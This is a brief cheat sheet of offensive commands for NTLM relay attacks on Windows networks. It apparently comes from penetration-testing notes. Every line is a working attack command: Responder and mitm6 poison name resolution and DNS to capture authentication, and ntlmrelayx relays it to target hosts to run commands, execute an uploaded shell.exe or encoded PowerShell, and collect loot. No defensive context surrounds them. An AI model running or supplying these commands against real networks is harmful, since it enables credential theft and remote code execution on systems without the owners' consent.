# Setup SMB relay with ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# With elevated privileges
ntlmrelayx.py -tf targets.txt -smb2support -e shell.exe

# Responder for capturing hashes (run on attacker)
responder -I eth0 -wdv

# Combine with ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support -c "powershell -enc BASE64"

# IPv6 DNS poisoning
mitm6 -d domain.local
ntlmrelayx.py -6 -wh wpad.domain.local -tf targets.txt -l loot